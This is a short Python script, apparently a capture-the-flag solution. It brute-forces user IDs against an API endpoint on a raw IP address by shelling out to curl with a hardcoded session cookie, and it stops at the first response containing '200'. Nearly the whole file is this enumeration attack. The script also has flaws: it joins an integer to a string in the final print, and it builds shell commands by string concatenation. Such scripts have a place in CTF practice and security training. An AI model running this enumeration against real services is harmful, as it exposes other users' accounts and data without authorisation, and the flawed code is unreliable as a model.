import os,json
for uid in range(1,100000000):
    uid1 = str(uid)
    response = os.popen("curl 'http://45.113.201.36/api/ctf/5?uid="+uid1+"' \
  -H 'Connection: keep-alive' \
  -H 'Accept: */*' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Referer: http://45.113.201.36/user.html' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cookie: role=ee11cbb19052e40b07aac0ca060c23ee; session=eyJ1aWQiOiIxMTAxODUyNzEifQ.X5PYTg.OvGEmqZuNTkWw2Qec0W2GzEXvGg' \
  --compressed \
  --insecure").read()
    
    if '200' in response:
        success_uid = uid
        success_response = response
        break


print("--------------------------------------------------------")
print("success_uid = "+success_uid)
print("success_response = "+success_response)
print("--------------------------------------------------------")
